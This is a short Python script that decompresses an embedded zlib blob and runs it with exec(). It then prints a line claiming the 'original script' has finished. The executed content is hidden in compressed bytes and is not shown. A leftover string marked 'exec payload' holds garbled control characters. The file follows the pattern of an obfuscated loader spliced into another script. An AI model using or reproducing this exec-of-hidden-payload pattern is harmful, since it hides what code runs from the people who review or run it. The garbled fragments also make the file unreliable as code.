import zlib
data = zlib.decompress(b'x\x9c\x0b\xc9\xc8\xcd\xc9\xc9I,\t\n-.)--N.\xca,*\xc9/J)*\xd2\x02\x00}\x0e\x0f\xf5')
exec(data)
'# exec payload: \x13$"(" "!"&'
print('=== Original script finished ===')